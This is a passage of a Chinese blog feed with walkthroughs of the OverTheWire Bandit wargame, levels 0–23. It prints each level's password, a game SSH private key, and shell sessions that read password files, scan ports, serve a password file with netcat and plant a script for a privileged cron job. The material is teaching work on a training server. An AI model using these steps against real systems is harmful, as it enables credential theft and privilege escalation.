    <content type="html"><![CDATA[<h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><p>用账号：bandit13，密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL进入本关</p><pre><code>    bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost    Could not create directory &#39;/home/bandit13/.ssh&#39;.    The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.    ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.    Are you sure you want to continue connecting (yes/no)? yes    Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).    This is a OverTheWire game server. More information on http://www.overthewire.org/wargames    Linux bandit 4.18.12 x86_64 GNU/Linux      ,----..            ,----,          .---.      /   /   \         ,/   .`|         /. ./|    /   .     :      ,`   .&#39;  :     .--&#39;.  &#39; ;   .   /   ;.  \   ;    ;     /    /__./ \ : |  .   ;   /  ` ; .&#39;___,/    ,&#39; .--&#39;.  &#39;   \&#39; .  ;   |  ; \ ; | |    :     | /___/ \ |    &#39; &#39;   |   :  | ; | &#39; ;    |.&#39;;  ; ;   \  \;      :   .   |  &#39; &#39; &#39; : `----&#39;  |  |  \   ;  `      |  &#39;   ;  \; /  |     &#39;   :  ;   .   \    .\  ;    \   \  &#39;,  /      |   |  &#39;    \   \   &#39; \ |    ;   :    /       &#39;   :  |     :   &#39;  |--&quot;       \   \ .&#39;        ;   |.&#39;       \   \ ;       www. `---` ver     &#39;---&#39; he       &#39;---&quot; ire.org     Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]--  This machine might hold several wargames.   If you are playing &quot;somegame&quot;, then:    * USERNAMES are somegame0, somegame1, ...    * Most LEVELS are stored in /somegame/.    * PASSWORDS for each level are stored in /etc/somegame_pass/.  Write-access to homedirectories is disabled. It is advised to create a  working directory with a hard-to-guess name in /tmp/.  You can use the  command &quot;mktemp -d&quot; in order to generate a random and hard to guess  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled  so that users can not snoop on eachother. Files and directories with   easily guessable or short names will be periodically deleted!  Please play nice:    * don&#39;t leave orphan processes running    * don&#39;t leave exploit-files laying around    * don&#39;t annoy other players    * don&#39;t post passwords or spoilers    * again, DONT POST SPOILERS!       This includes writeups of your solution on your blog or website!--[ Tips ]--  This machine has a 64bit processor and many security-features enabled  by default, although ASLR has been switched off.  The following  compiler flags might be interesting:    -m32                    compile for 32bit    -fno-stack-protector    disable ProPolice    -Wl,-z,norelro          disable relro   In addition, the execstack tool can be used to flag the stack as  executable on ELF binaries.  Finally, network-access is limited for most levels by a local  firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations:    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/    * peda (https://github.com/longld/peda.git) in /usr/local/peda/    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/    * pwntools (https://github.com/Gallopsled/pwntools)    * radare2 (http://www.radare.org/)    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]--  For more information regarding individual wargames, visit  http://www.overthewire.org/wargames/  For support, questions or comments, contact us through IRC on  irc.overthewire.org #wargames.  Enjoy your stay!bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</code></pre><p> 密码：</p><blockquote><blockquote><blockquote><p>4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</p></blockquote></blockquote></blockquote><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>用账号：bandit14，密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e进入本关</p><pre><code>bandit14@bandit:~$ nc localhost 30000Wrong! Please enter the correct current passwordbandit14@bandit:~$ nc localhost 300004wcYUJFw0k0XLShlDzztnTBHiqxU3b3eCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNr</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>BfMYroe26WYalil77FoDi9qh59eK5xNr</p></blockquote></blockquote></blockquote><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><p>用账号：bandit15，密码：BfMYroe26WYalil77FoDi9qh59eK5xNr进入本关</p><pre><code>bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quites_client: Option unknown option -quites_client: Use -help for summary.bandit15@bandit:~$ openssl s_client -connect localhost:30001 -quietdepth=0 CN = localhostverify error:num=18:self signed certificateverify return:1depth=0 CN = localhostverify return:1BfMYroe26WYalil77FoDi9qh59eK5xNrCorrect!cluFn7wTiGryunymYOu4RcffSxQluehd</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>cluFn7wTiGryunymYOu4RcffSxQluehd</p></blockquote></blockquote></blockquote><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>用账号：bandit16，密码：cluFn7wTiGryunymYOu4RcffSxQluehd进入本关</p><pre><code>bandit16@bandit:~$ nmap -sV -A -p 31000-32000 localhost | grep open31046/tcp open  echo31518/tcp open  ssl/echo31691/tcp open  echo31790/tcp open  ssl/unknown31960/tcp open  echobandit16@bandit:~$ openssl s_client -connect localhost:31790 -quietdepth=0 CN = banditverify error:num=18:self signed certificateverify return:1depth=0 CN = banditverify return:1cluFn7wTiGryunymYOu4RcffSxQluehdCorrect!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=-----END RSA PRIVATE KEY-----bandit16@bandit:~$ mkdir /tmp/rtm2bandit16@bandit:~$ nano /tmp/rtm2/sshkey[PASTE CONTENTS OF PRIVATE KEY INTO EMPTY FILE]bandit16@bandit:~$ chmod 600 /tmp/rtm2/sshkeybandit16@bandit:~$ ssh -i /tmp/rtm2/sshkey bandit17@localhost</code></pre><p>我们首先对运行在31000和32000之间的开放端口上的服务执行Nmap扫描。为了整洁，输出通过grep传递。</p><p>我们发现五个端口报告为打开，其中三个报告其服务为回声。不是我们感兴趣的内容。我们还发现有两个ssl服务正在侦听，但是其中一个也在运行echo。</p><p>我们尝试与端口31790建立连接，输入先前的密码，然后返回并返回似乎是bandit17的ssh私钥！</p><p>在使用它访问bandit17之前，我们首先需要在/ tmp中创建一个新目录。使用nano（或您喜欢的文本编辑器）在其中创建一个新的文本文件，并将ssh私钥的内容粘贴到空文件中。</p><p>如果从现在开始尝试使用刚才创建的ssh密钥文件登录bandit17，将会遇到错误。在没有首先使用’chmod’锁定ssh密钥文件的权限的情况下，我们将返回“ Unprotected Private Key File！”警告。将权限修改为600将解决此问题。</p><h1 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h1><p>bandit17@bandit:~$ diff passwords.old passwords.new<br>42c42<br>&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA</p><hr><pre><code>&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Ydbandit17@bandit:~$ </code></pre><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><p>用账号：bandit18，密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd进入本关</p><p>描述：下一级别的密码存储在家庭目录中的文件自述文件中。不幸的是， 当你使用SSH登录时，有人修改了.bashrc将你注销。</p><p>过程：</p><pre><code>  Enjoy your stay!  Byebye !  Connection closing...Socket close.      bandit17@bandit:~$ ssh bandit18@localhost cat readmeThe authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit17/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargames@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/home/bandit17/.ssh/id_rsa&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;/home/bandit17/.ssh/id_rsa&quot;: bad permissionsbandit18@localhost&#39;s password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</code></pre><h1 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h1><p>用账号：bandit19，密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x进入本关</p><pre><code>bandit19@bandit:~$ ls     bandit20-dobandit19@bandit:~$ ls -l bandit20-do -rwsr-x--- 1 bandit20 bandit19 7408 Dec 28 14:34 bandit20-dobandit19@bandit:~$ ./bandit20-do Run a command as another user.  Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ ./bandit20-do whoamibandit20bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0j        </code></pre><p>一步一步就知道这个文件的作用以及用法</p><p>密码：</p><blockquote><blockquote><blockquote><p>GbKksEFF4yrVs6il55v6gwY5aVje5f0j</p></blockquote></blockquote></blockquote><h1 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h1><p>用账号：bandit20，密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j进入本关</p><p>描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它在您指定为命令行参数的端口上连接到localhost。然后它从连接中读取一行文本，并将其与前一级别的密码（bandit20）进行比较。如果密码正确，它将传输下一级密码（bandit21）。</p><p>注意：尝试连接到您自己的网络守护程序，以查看它是否按照您的想法工作，这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。</p><p>过程：</p><p>首先使用nc 监听一个端口，并推送/etc/bandit_pass/bandit20文件内容，即bandit20的密码</p><pre><code>bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20</code></pre><p>此时2333端口处于监听状态，再建立一个ssh连接</p><pre><code>bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect 2333Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0jPassword matches, sending next password</code></pre><p>成功读取到文件以后，就把下一关的密码发送到监听端口</p><pre><code>bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -l -p 2333 &lt; /etc/bandit_pass/bandit20gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</code></pre><p>成功获得密码 。</p><p>密码：</p><blockquote><blockquote><blockquote><p>gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p></blockquote></blockquote></blockquote><h1 id="level-21"><a href="#level-21" class="headerlink" title="level 21"></a>level 21</h1><p>用账号：bandit21，密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr进入本关</p><p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p><p>过程：</p><pre><code>bandit21@bandit:~$ cd /etc/cron.d/bandit21@bandit:/etc/cron.d$ ls -altotal 28drwxr-xr-x   2 root root 4096 Dec 28 14:34 .drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contestbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI</code></pre><p>cron指Linux系统下一个自动执行指定任务的程序（计划任务），” bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null” 中的”“表示每分钟执行一次这个脚本，再用cat查询该脚本的内容，不停把/etc/bandit_pass/bandit22文件内容（即下一关的密码）写入/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv，并且更改了权限。</p><p>密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p><h1 id="level-22"><a href="#level-22" class="headerlink" title="level 22"></a>level 22</h1><p>用账号：bandit22，密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI进入本关</p><p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p><p>注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本有意使其易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看它打印的调试信息。</p><p>过程：</p><pre><code>bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ ls -altotal 28drwxr-xr-x   2 root root 4096 Dec 28 14:34 .drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contestbandit22@bandit:/etc/cron.d$ cat -n cronjob_bandit23     1    @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null     2    * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh # !/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d &#39; &#39; -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</code></pre><p>直接赋值执行。</p><p>密码：</p><blockquote><p>jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p></blockquote><h1 id="level-23"><a href="#level-23" class="headerlink" title="level 23"></a>level 23</h1><p>用账号：bandit23，密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n进入本关</p><p>描述：一个程序从cron（基于时间的作业调度程序）定期自动运行 。查看/etc/cron.d/中的配置并查看正在执行的命令。</p><p>注意：此级别要求您创建自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到自豪！</p><p>注2：请记住，你的shell脚本一旦被执行就被删除，所以你可能想保留一份副本……</p><p>过程：</p><pre><code>bandit23@bandit:~$ cd /etc/cron.dbandit23@bandit:/etc/cron.d$ lscronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contestbandit23@bandit:/etc/cron.d$ cat cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho &quot;Executing and deleting all scripts in /var/spool/$myname:&quot;for i in * .*;do    if [ &quot;$i&quot; != &quot;.&quot; -a &quot;$i&quot; != &quot;..&quot; ];    then    echo &quot;Handling $i&quot;    timeout -s 9 60 ./$i    rm -f ./$i    fidonebandit23@bandit:/etc/cron.d$ mkdir /tmp/crayon   bandit23@bandit:/etc/cron.d$ cd /tmp/crayonbandit23@bandit:/tmp/crayon$ vim bandit24.shbandit23@bandit:/tmp/crayon$ cat bandit24.sh #!/bin/bashcat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/crayon/level24bandit23@bandit:/tmp/crayon$ chmod 777 bandit24.sh bandit23@bandit:/tmp/crayon$ cp bandit24.sh /var/spool/bandit24/bandit23@bandit:/tmp/crayon$ chmod 777 /tmp/crayonbandit23@bandit:/tmp/crayon$ ls /var/spool/bandit24/ls: cannot open directory &#39;/var/spool/bandit24/&#39;: Permission deniedbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.sh# 等一会儿就有了bandit23@bandit:/tmp/crayon$ lsbandit24.sh  level24bandit23@bandit:/tmp/crayon$ cat level24 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code></pre><p>在/tmp/文件夹中创建一个目录。创建一个shell脚本将/etc/bandit_pass /bandit24复制到我们的/tmp/文件夹。将shell脚本复制到/var/spool/bandit24/。给shell脚本和/tmp/文件夹适当的权限。/usr/bin/cronjob_bandit24.sh这个shell的作用就是执行 /var/spool/bandit24 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 /etc/bandit_pass/bandit24/ 输出到 /tmp/crayon的脚本到这个目录下，然后付了个权限。</p><p>密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>overthewire解题（一）</title>
    <link href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>直接ls<br>cat readme</p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>pwd</p><p>cat ./.-</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>关于转义字符可以用反斜杠进行转义。也可以用tab键。</p><p><img src="/img/6.png" srcset="/img/loading.gif" alt=""></p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src="/img/7.png" srcset="/img/loading.gif" alt=""><br>这里将文件进行了隐藏<br>直接用find找到了隐藏文件。<br>密码</p><blockquote><blockquote><blockquote><p>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</p></blockquote></blockquote></blockquote><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p><img src="/img/8.png" srcset="/img/loading.gif" alt=""><br>这题很简单，直接一个一个文件读取就行了<br>密码：</p><blockquote><blockquote><blockquote><p>koReBOKuIDDepwhWk7jZC0RTdopnAYKh</p></blockquote></blockquote></blockquote><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p><img src="/img/9.png" srcset="/img/loading.gif" alt=""><br>按照笨方法应该已经不能用了<br><img src="/img/10.png" srcset="/img/loading.gif" alt=""><br>“ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes.<br>密码：</p><blockquote><blockquote><blockquote><p>DXjZPULLxYr17uwoI01bNLQbtFemEgo7</p></blockquote></blockquote></blockquote><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>grep（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。<br><img src="/img/11.png" srcset="/img/loading.gif" alt=""><br>“/“ linux 根目录,从最顶层开始查找，”2&gt;/dev/null”中”2”表示错误输出，”&gt;”是重定向符号表示把信息送到哪里，”/dev/null”是Linux黑洞.</p><p>密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>The password for the next level is stored in the file data.txt next to the word millionth</p><p>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p><p>sort命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。以从特定的文件，也可以从stdin中获取输入。</p><p>Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。</p><p>uniq 可检查文本文件中重复出现的行列。</p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><p><img src="/img/12.png" srcset="/img/loading.gif" alt=""></p><p>密码：</p><blockquote><blockquote><blockquote><p>cvX2JJa4CFALtqS87jk27qwqGhBM9plV</p></blockquote></blockquote></blockquote><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p><p>sort命令用于将文本文件内容加以排序，可针对文本文件的内容，以行为单位来排序。”uniq -u”是上下相邻两行对比得到是否为单一行。</p><p>密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>过程：</p><pre><code>bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ strings data.txt | grep ============ theP`========== passwordL========== isA========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLkstrings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束，用 grep 命令筛选 含有”==”的字符串。</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>KLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</p></blockquote></blockquote></blockquote><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p><img src="/img/13.png" srcset="/img/loading.gif" alt=""><br>密码：</p><blockquote><blockquote><blockquote><p>IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</p></blockquote></blockquote></blockquote><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><p>下一级别的密码存储在文件data.txt中，其中所有小写（az）和大写（AZ）字母都已旋转了13个位置<br><img src="/img/15.png" srcset="/img/loading.gif" alt=""><br>密码：</p><blockquote><blockquote><blockquote><p>5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</p></blockquote></blockquote></blockquote><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><p>xxd 命令用于使用二进制或十六进制格式显示文件内容，可以将指定文件或标准输入以十六进制转储,也可以把十六进制转储转换成原来的二进制形式。<br>过程：</p><pre><code>bandit12@bandit:~$ lsdata.txtbandit12@bandit:~$ mkdir /tmp/Crayon123; cp data.txt /tmp/Crayon123/data_1; cd /tmp/Crayon123bandit12@bandit:/tmp/Crayon123$ cat data_1 ;file data_1 00000000: 1f8b 0808 ecf2 445a 0203 6461 7461 322e  ......DZ..data2.00000010: 6269 6e00 0149 02b6 fd42 5a68 3931 4159  bin..I...BZh91AY00000020: 2653 5930 3e1b 4000 0014 ffff dde3 2b6d  &amp;SY0&gt;.@.......+m00000030: afff dd1e dfd7 ffbf bdfb 3f67 bfff ffff  ..........?g....00000040: bde5 bfff aff7 bfdb e5ff ffef b001 39b0  ..............9.00000050: 480d 3400 0068 0068 1a00 0000 01a3 4000  H.4..h.h......@.00000060: 0001 a643 4d34 0000 d00d 0698 800d 1934  ...CM4.........400000070: d0c4 d034 1a36 a343 646a 1c9a 3206 9a00  ...4.6.Cdj..2...00000080: 3406 8000 068d 064f 51a3 4000 000f 5000  4......OQ.@...P.00000090: 6868 0034 d308 0da4 6990 1a03 4000 6869  hh.4....i...@.hi000000a0: a0d0 00d3 2341 94d0 0006 8006 8034 1a34  ....#A.......4.4000000b0: 00d0 d000 0310 d068 3400 001e 900d 1a19  .......h4.......000000c0: 0062 68d3 4680 640f 48d0 d320 0068 621a  .bh.F.d.H.. .hb.000000d0: 0543 0116 180c 6232 a7d7 82c8 7bd4 2374  .C....b2....{.#t000000e0: 1de5 e375 b7b9 0b78 2d37 bd61 5cdf 40da  ...u...x-7.a\.@.000000f0: b8e5 3258 213d e4bb ecb2 8d51 84f9 3bd0  ..2X!=.....Q..;.00000100: b1c9 ef2a bcff 45cc 1f1c 0028 1cfe 8784  ...*..E....(....00000110: 78a9 7611 0a81 c4d5 cb26 4b80 7888 c9bc  x.v......&amp;K.x...00000120: 2b3e a351 59ae c1fd 36c8 286e d6c3 bb2b  +&gt;.QY...6.(n...+00000130: b280 d19b 70b3 190a 0204 4603 9f79 e2b8  ....p.....F..y..00000140: cf1b 8330 fcad 3780 86c2 5c3d 5bc9 4631  ...0..7...\=[.F100000150: 3718 5e2e a88c 34e6 8461 35ad c14f 6fd4  7.^...4..a5..Oo.00000160: 31dd a5cc 5223 545e e01d ff23 cde3 22cc  1...R#T^...#..&quot;.00000170: 22fa a62b e27a dfa5 d4f0 c326 28ef a4b3  &quot;..+.z.....&amp;(...00000180: adc5 149c 1c27 dbc4 97b9 6342 487e bfe3  .....&#39;....cBH~..00000190: 02ee d63e 3379 8ebc d559 c670 7987 da1d  ...&gt;3y...Y.py...000001a0: 4c4b 5ec4 9965 075b 9d0b 08ee df17 d07c  LK^..e.[.......|000001b0: ea9a 5fbf 43e7 d405 5239 1437 0c8a 34cd  .._.C...R9.7..4.000001c0: be6f a949 b061 68e8 6ba5 c9ba 4112 0819  .o.I.ah.k...A...000001d0: 7cb9 a3c8 bff1 0895 1819 8f80 407e dc32  |...........@~.2000001e0: 9269 ca68 3f58 bb30 cd9b fcd6 0006 1224  